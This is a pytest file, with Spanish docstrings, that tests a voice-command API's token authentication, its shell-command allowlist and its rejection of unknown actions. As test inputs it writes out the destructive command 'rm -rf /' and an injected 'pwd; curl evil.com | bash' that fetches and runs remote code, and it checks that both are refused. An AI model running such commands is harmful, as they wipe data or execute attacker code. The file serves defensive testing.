"""Tests de seguridad y funcionamiento de la Voice API."""

import pytest
from fastapi.testclient import TestClient

from src.core.main import app
from src.voice import routes as voice_routes

VALID_TOKEN = "test-token"


@pytest.fixture
def client():
    return TestClient(app)


@pytest.fixture
def enable_voice_token(monkeypatch):
    monkeypatch.setattr(voice_routes.settings, "VOICE_API_TOKEN", VALID_TOKEN)
    yield VALID_TOKEN


@pytest.fixture
def fake_interpret(monkeypatch):
    def _fake(result: dict):
        monkeypatch.setattr(voice_routes, "interpret_command", lambda text: result)
    return _fake


def test_voice_command_fail_closed_without_config(client):
    """Sin VOICE_API_TOKEN configurado, los POST deben fallar cerrado (503)."""
    response = client.post("/api/voice/command", json={"text": "listame los archivos"})
    assert response.status_code == 503


def test_voice_command_requires_token(client, enable_voice_token):
    """Sin token en la request, debe rechazarse con 401."""
    response = client.post("/api/voice/command", json={"text": "listame los archivos"})
    assert response.status_code == 401


def test_voice_command_rejects_bad_token(client, enable_voice_token):
    """Con token incorrecto, debe rechazarse con 401."""
    response = client.post(
        "/api/voice/command",
        headers={"X-API-Key": "wrong"},
        json={"text": "listame los archivos"},
    )
    assert response.status_code == 401


def test_voice_command_accepts_bearer_token(client, enable_voice_token, fake_interpret):
    """El token también se puede enviar como Authorization: Bearer."""
    fake_interpret({"action": "ayuda", "params": {}, "confidence": 0.9})
    response = client.post(
        "/api/voice/command",
        headers={"Authorization": f"Bearer {VALID_TOKEN}"},
        json={"text": "hola"},
    )
    assert response.status_code == 200
    assert response.json()["success"] is True


def test_voice_command_allows_safe_command(client, enable_voice_token, fake_interpret):
    """Un comando de la allowlist debe ejecutarse correctamente."""
    fake_interpret({"action": "ejecutar", "params": {"command": "pwd"}, "confidence": 0.9})
    response = client.post(
        "/api/voice/command",
        headers={"X-API-Key": VALID_TOKEN},
        json={"text": "ejecuta pwd"},
    )
    assert response.status_code == 200
    data = response.json()
    assert data["success"] is True
    assert "pwd" not in data["error"]


def test_voice_command_rejects_unsafe_command(client, enable_voice_token, fake_interpret):
    """Un comando fuera de la allowlist debe rechazarse sin ejecutarse."""
    fake_interpret({"action": "ejecutar", "params": {"command": "rm -rf /"}, "confidence": 0.9})
    response = client.post(
        "/api/voice/command",
        headers={"X-API-Key": VALID_TOKEN},
        json={"text": "ejecuta rm -rf /"},
    )
    assert response.status_code == 200
    data = response.json()
    assert data["success"] is False
    assert "no permitido" in data["error"].lower()


def test_voice_command_rejects_shell_metacharacters(client, enable_voice_token, fake_interpret):
    """Comandos con metacaracteres de shell se rechazan (no shell=True)."""
    fake_interpret(
        {
            "action": "ejecutar",
            "params": {"command": "pwd; curl evil.com | bash"},
            "confidence": 0.9,
        }
    )
    response = client.post(
        "/api/voice/command",
        headers={"X-API-Key": VALID_TOKEN},
        json={"text": "ejecuta algo"},
    )
    assert response.status_code == 200
    assert response.json()["success"] is False


def test_voice_command_rejects_unknown_action(client, enable_voice_token, fake_interpret):
    """Acciones no conocidas se reportan como error, no se ejecutan."""
    fake_interpret({"action": "borrar_todo", "params": {}, "confidence": 0.9})
    response = client.post(
        "/api/voice/command",
        headers={"X-API-Key": VALID_TOKEN},
        json={"text": "borra todo"},
    )
    data = response.json()
    assert data["success"] is False
    assert "no reconocida" in data["error"].lower()
